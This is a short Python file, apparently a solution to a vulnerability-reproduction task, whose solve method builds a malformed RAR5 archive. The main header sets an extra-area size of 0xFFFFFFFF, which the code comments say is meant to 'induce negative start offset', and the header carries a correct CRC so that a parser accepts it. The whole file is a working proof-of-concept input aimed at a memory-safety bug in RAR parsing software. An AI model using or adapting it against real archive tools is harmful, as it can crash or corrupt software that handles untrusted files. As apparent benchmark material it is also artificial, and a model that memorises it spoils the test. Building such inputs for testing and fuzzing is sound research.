import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def leb128_u(n: int) -> bytes:
            out = bytearray()
            while True:
                b = n & 0x7F
                n >>= 7
                if n:
                    out.append(0x80 | b)
                else:
                    out.append(b)
                    break
            return bytes(out)

        signature = b'Rar!\x1a\x07\x01\x00'
        head_type = 1  # MAIN
        flags = 1      # HFL_EXTRA
        extra_size = 0xFFFFFFFF  # Large extra size to induce negative start offset

        header_after_size = leb128_u(head_type) + leb128_u(flags) + leb128_u(extra_size)
        head_size = leb128_u(len(header_after_size))
        crc = zlib.crc32(header_after_size) & 0xFFFFFFFF

        poc = signature + struct.pack('<I', crc) + head_size + header_after_size
        return poc
